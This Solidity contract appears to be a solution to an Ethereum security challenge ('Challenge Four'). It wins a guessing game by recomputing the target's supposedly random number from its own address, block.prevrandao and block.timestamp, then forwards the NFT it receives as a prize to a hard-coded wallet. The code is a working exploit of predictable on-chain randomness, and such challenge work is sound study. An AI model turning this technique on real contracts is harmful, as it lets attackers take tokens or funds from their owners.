// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "@openzeppelin/contracts/interfaces/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface ChallengeFour {
    function solveChallenge(uint256 guess, string memory yourTwitterHandle) external;
}

contract ChallengeFourSolver is IERC721Receiver {
    address immutable i_challenge;
    address constant myAddress = 0xEE6f59F7118a8A4B906e9Dbbe7F010a91F8E73cB;

    constructor(address challenge) {
        i_challenge = challenge;
    }

    function owner() external view returns (address) {
        return address(this);
    }

    function go() external {
        uint256 guess =
            uint256(keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp))) % 1_000_000;
        ChallengeFour(i_challenge).solveChallenge(guess, "aciDrums7");
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
        // TODO: transfer NFT to my address
        IERC721(msg.sender).safeTransferFrom(address(this), myAddress, tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }
}
